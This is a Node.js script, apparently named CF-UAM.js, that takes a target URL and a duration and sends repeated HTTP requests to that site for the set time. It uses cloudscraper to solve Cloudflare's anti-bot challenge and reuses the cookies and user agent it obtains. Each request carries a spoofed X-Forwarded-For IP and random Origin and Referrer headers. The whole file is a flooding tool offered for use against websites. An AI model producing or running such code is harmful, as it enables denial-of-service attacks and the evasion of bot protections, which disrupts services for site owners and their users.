const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require('randomstring');

// Validate arguments
if (process.argv.length <= 3) {
    console.log("Usage: node CF-UAM.js <url> <time>");
    console.log("Example: node CF-UAM.js https://www.example.com 60");
    process.exit(-1);
}

const url = process.argv[2];
const duration = parseInt(process.argv[3], 10);

// Helper function to generate random byte values
const randomByte = () => Math.floor(Math.random() * 256);

// Function to handle HTTP requests
const makeRequest = async () => {
    try {
        const response = await cloudscraper.get(url);
        const cookies = response.request.headers.cookie || '';
        const userAgent = response.request.headers['user-agent'] || '';

        const rand = randomstring.generate({
            length: 12,
            charset: 'alphabetic'
        });

        const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

        const options = {
            url,
            headers: {
                'User-Agent': userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': cookies,
                'Origin': `http://${rand}.com`,
                'Referrer': `http://google.com/${rand}`,
                'X-Forwarded-For': ip
            }
        };

        request(options, (error) => {
            if (error) {
                console.error('Request error:', error);
            }
        });

    } catch (error) {
        console.error('Error during cloud scraping:', error);
    }
};

// Start sending requests at intervals
const interval = setInterval(makeRequest, 1000);
setTimeout(() => clearInterval(interval), duration * 1000);

// Handle uncaught exceptions and unhandled promise rejections
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});
